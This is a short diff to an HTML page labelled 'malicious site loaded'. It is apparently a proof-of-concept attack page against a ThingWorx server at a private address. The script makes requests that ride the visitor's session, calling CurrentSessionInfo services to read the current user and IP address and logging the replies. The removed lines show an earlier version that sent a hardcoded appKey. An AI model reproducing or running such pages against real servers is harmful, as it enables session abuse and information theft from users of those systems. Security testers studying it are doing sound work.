@@ -7,16 +7,19 @@
   <body>
     <h2> malicious site loaded </h2>
     <script type="text/javascript">
-      var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://192.168.48.147/Thingworx/Things", true);
-      xhr.setRequestHeader("appKey", "1ed57476-0714-4edb-b6e6-b9f2719bbec1");
+      let xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://192.168.48.147/Thingworx/Resources/CurrentSessionInfo/Services/GetCurrentIPAddress", true);
       xhr.setRequestHeader("accept", "application/json");
       xhr.send();
       xhr.onload = function (){
         console.log(xhr.responseText);
       };
-      console.log(window.parent.document);
-      console.log(window.parent);
+      xhr.open("POST", "https://192.168.48.147/Thingworx/Resources/CurrentSessionInfo/Services/GetCurrentUser", true);
+      xhr.setRequestHeader("accept", "application/json");
+      xhr.send();
+      xhr.onload = function (){
+        console.log(xhr.responseText);
+      };
     </script>
   </body>
 </html>
